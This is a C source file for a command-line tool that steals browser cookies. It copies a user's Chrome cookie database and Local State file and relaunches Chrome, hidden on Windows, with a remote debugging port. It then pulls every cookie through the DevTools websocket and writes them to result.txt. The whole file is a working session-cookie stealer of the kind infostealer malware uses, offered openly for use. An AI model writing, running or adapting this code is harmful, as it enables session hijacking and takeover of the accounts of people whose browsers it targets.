
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>

#include "libchcooky.h"

typedef enum
{
    true=1, false=0
} bool;


#if (defined(__APPLE__) && defined(__GNUC__)) || defined(__MACOSX__)
    #define _OS_MAC_
    #include <signal.h>
    #include <fcntl.h>
    #define CHROME_NAME "Google Chrome"
    #define FILE_SPLIT "/"
    #define CHROME_DATA "/tmp/chrome_data"
    #define DEFAULT_USERDATA "/Library/Application Support/Google/Chrome"
    #define sprintf_s snprintf
    #define FIFO "/tmp/stdout_fifo"

#elif (defined(_WIN64) || defined(__WIN64__) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__))
    #include <windows.h>
    #define _OS_WINDOWS_
    #define CHROME_NAME "chrome.exe"
    #define FILE_SPLIT "\\"
    #define DEFAULT_USERDATA "\\AppData\\Local\\Google\\Chrome\\User Data"

#else
    #define _OS_LINUX_
    #include <signal.h>
    #include <fcntl.h>
    #define CHROME_NAME "chrome"
    #define FILE_SPLIT "/"
    #define CHROME_DATA "/tmp/chrome_data"
    #define DEFAULT_USERDATA "/.config/google-chrome/default"
    #define FIFO "/tmp/stdout_fifo"
#endif

#define CHROME_DBG_PORT "43210"


static bool headless = false;


void print_help(char* argv0)
{
    printf("Usage: %s [options]\t - Code by: Hmiyc\n", argv0);
    printf("Options:\n");
    printf("\t--chrome:  \tChrome program executable file's path.\n");
    printf("\t--data:    \tChrome program user-data-dir.\n");
    printf("\t--headless:\tEnable headless mode.(Recommended when working on Windows platform.)\n");
    printf("\t--save:    \tSave result file's path, default: result.txt in cwd.\n");
    printf("\t--help:    \tPrint this.\n");
}

#ifdef _OS_WINDOWS_
void handle_stdout()
{
    AttachConsole(-1);
    HANDLE hConOut = GetStdHandle(STD_OUTPUT_HANDLE);
    int fd1 = _open_osfhandle((intptr_t)hConOut, 0);
    _dup2(fd1, 1);
    freopen("CONOUT$", "w+t", stdout);
}
#endif


void kill_chrome(int pid)
{

#ifdef _OS_WINDOWS_
    char cmd[255] = {0};
    sprintf_s(cmd, 255, "taskkill /f /pid %d", pid);
    system(cmd);
#else
    kill(pid, SIGTERM);
#endif
}




#ifndef _OS_WINDOWS_

void file_copy(const char src[], const char dst[])
{
    FILE *fpbr, *fpbw;

    // Try to open source file
    fpbr = fopen(src, "rb");
    if (fpbr == NULL) {
        printf("[!] Error for opening source file %s!\n", src);
        exit(1);
    }

    // Try to open destination file
    fpbw = fopen(dst, "wb");
    if (fpbr == NULL) {
        printf("[!] Error for opening destination file %s!\n", dst);
        exit(1);
    }

    // Copy file with fread() and fwrite()
    char ch[4096];
    while (fread(ch, sizeof(char), 1, fpbr) != 0)
        fwrite(ch, sizeof(char), 1, fpbw);

    // printf("[-] copy file successfully!\n");
    fclose(fpbr);
    fclose(fpbw);
}


int remove_dir(const char *dir)
{
    char cur_dir[] = ".";
    char up_dir[] = "..";
    char dir_name[128];
    DIR *dirp;
    struct dirent *dp;
    struct stat dir_stat;

    if (0 > stat(dir, &dir_stat))
    {
        // perror("get directory stat error!\n");
        unlink(dir);
        return -1;
    }

    if (S_ISREG(dir_stat.st_mode)) { remove(dir); }
    else if (S_ISDIR(dir_stat.st_mode))
    {
        if (0 != access(dir, F_OK))
        {
            printf("[-] %s is not access!\n", dir);
            return 0;
        }

        dirp = opendir(dir);
        while ((dp = readdir(dirp)) != NULL)
        {
            if ((0 == strcmp(cur_dir, dp->d_name)) || (0 == strcmp(up_dir, dp->d_name))) { continue; }

            sprintf(dir_name, "%s/%s", dir, dp->d_name);
            remove_dir(dir_name);
        }
        closedir(dirp);
        int r;
        if ((r = rmdir(dir)) != 0) { remove_dir(dir); }

    }
    else { unlink(dir); }
    return 0;
}

void prepare_env(char* data_path)
{
    char *d_dir = malloc(256);
    sprintf(d_dir, "%s/Default", CHROME_DATA);

    char cookie_path[256];
    char stat_path[256];

    sprintf(cookie_path, "%s/Default/Cookies", data_path);
    sprintf(stat_path, "%s/Local State", data_path);

    mkdir(CHROME_DATA, 0777);
    mkdir(d_dir, 0777);

    file_copy(cookie_path, CHROME_DATA"/Default/Cookies");
    file_copy(stat_path, CHROME_DATA"/Local State");
    printf("[+] ENV ready!\n");
}


#endif


int start_chrome(char* chrome_path, char* user_data)
{
    int chrome_pid = 0;
    printf("[-] Headless mode: %d\n", headless);

#ifdef _OS_WINDOWS_
    char cmd[512] = {0};
    sprintf_s(cmd, 512, "%s %s --remote-debugging-port=%s --user-data-dir=\"%s\"",
        chrome_path, headless ? "--headless" : "", CHROME_DBG_PORT, user_data);
    printf("[+] command: %s\n", cmd);

    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess (
        NULL,   // 不在此指定可执行文件的文件名
        cmd,    // 命令行参数
        NULL,   // 默认进程安全性
        NULL,   // 默认进程安全性
        FALSE,  // 指定当前进程内句柄不可以被子进程继承
        CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口
        NULL,   // 使用本进程的环境变量
        NULL,   // 使用本进程的驱动器和目录
        &si,
        &pi);
    if(bRet)
    {
        // 不使用的句柄最好关掉
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[+] Chrome process id: %d\n", pi.dwProcessId);
        chrome_pid = pi.dwProcessId;
        return chrome_pid;
    }

#else
    char* arg1 = headless ? "--headless" : "";

    char* arg2 = "--remote-debugging-port="CHROME_DBG_PORT;

    char arg3[255] = {0};
    sprintf_s(arg3, 255, "--user-data-dir=%s", user_data);

    // printf("[-] Arg1 -> %s\n", arg1);
    // printf("[-] Arg2 -> %s\n", arg2);
    // printf("[-] Arg3 -> %s\n", arg3);

    char* chrome_args[5] = {chrome_path, arg1, arg2, arg3, NULL};

    unlink(FIFO);
    int fd;
    int res = mkfifo(FIFO, 0777);

    pid_t spid = fork();

    if (spid < 0)
    {
        perror("[!] Error in fork!");
        return -1;
    }

    if (spid == 0)
    {
        // subprocess
        fd = open(FIFO, O_WRONLY);
        dup2(fd, 1);
        dup2(fd, 2);
        execve(chrome_path, chrome_args, NULL);
    } else {
        // parent
        printf("[+] subprocess: %d\n", spid);
        char child_stdout[1024] = {0};
        fd = open(FIFO, O_RDONLY);

        while(true)
        {
            read(fd, child_stdout, sizeof(child_stdout));
            // printf("[-] child_stdout -> %s\n", child_stdout);
            if (strstr(child_stdout, "DevTools listening")) break;
            memset(child_stdout, 0, sizeof(child_stdout));
        }

        return (int)spid;
    }

#endif

    return -1;
}


char* find_arg(int argc, char* argv[], char *parameter)
{
    int i;
    char* p;
    for(i = 1; i < argc; i++)
    {
        p = argv[i];
        if (strcmp(p, parameter) == 0)
        {
            if(argv[i + 1]) { return argv[i + 1]; } else { return p; }
        }
    }
    return NULL;
}

int main(int argc, char* argv[])
{
    char *chrome = find_arg(argc, argv, "--chrome");
    char *userdata = find_arg(argc, argv, "--data");
    char *save = find_arg(argc, argv, "--save");

#ifdef _OS_WINDOWS_
    char* profile = getenv("USERPROFILE");
#else
    char* profile = getenv("HOME");
#endif

    char *dbg_ws_url = NULL;
    char *cookies = NULL;
    char url[255] = "http://127.0.0.1:"CHROME_DBG_PORT"/json";

    int chrome_pid = 0;

    if (find_arg(argc, argv, "--help"))
    {
        print_help(argv[0]);
        return 0;
    }

    if (!chrome)
#if defined(_OS_WINDOWS_)
    {
        printf("Parameter [chrome] invalid!\n");
        return -1;
    }
#elif defined(_OS_MAC_)
    {
        chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
    }

#endif


    if (!userdata)
#if defined(_OS_WINDOWS_)
    {
        printf("Parameter [userdata] invalid!\nHint: May \"%s%s\"\n", profile, DEFAULT_USERDATA);
        return -1;
    }
#elif defined(_OS_MAC_)
    {
        userdata = (char*)malloc(255);
        sprintf_s(userdata, 255, "%s%s", profile, DEFAULT_USERDATA);
    }
#endif

    headless = find_arg(argc, argv, "--headless") != NULL ? true : false;

#ifdef _OS_WINDOWS_

    // handle_stdout();
    /*
    if (!headless)
    {
        headless = true;
    }
    */

#else

    prepare_env(userdata);

#endif

    if(!save)
    {
        save = (char*)malloc(255);
        char* cwd = getcwd(NULL, 255);
        sprintf_s(save, 255, "%s%sresult.txt", cwd, FILE_SPLIT);
    }

#ifdef _OS_WINDOWS_
    if ((chrome_pid = start_chrome(chrome, userdata)) <= 0 )
#else
    if ((chrome_pid = start_chrome(chrome, CHROME_DATA)) <= 0 )
#endif
    {
        return -1;
    }

    // sleep(1);
    printf("[+] URL: %s\n", url);
    while (true)
    {
        dbg_ws_url = GetChromeDBGUrl(url);
        if (dbg_ws_url) break;
    }

    printf("[-] Debug websocket url: %s\n", dbg_ws_url);
    cookies = GetChromeCookiesFromWS(dbg_ws_url);
    printf("[+] Cookies -> \n%s\n", cookies);
    printf("[+] Save result to %s\n", save);

    FILE *sv = fopen(save, "a");
    if (!sv) perror("[!] fopen");

    fputs(cookies, sv);
    fclose(sv);

    kill_chrome(chrome_pid);
    return 0;

}
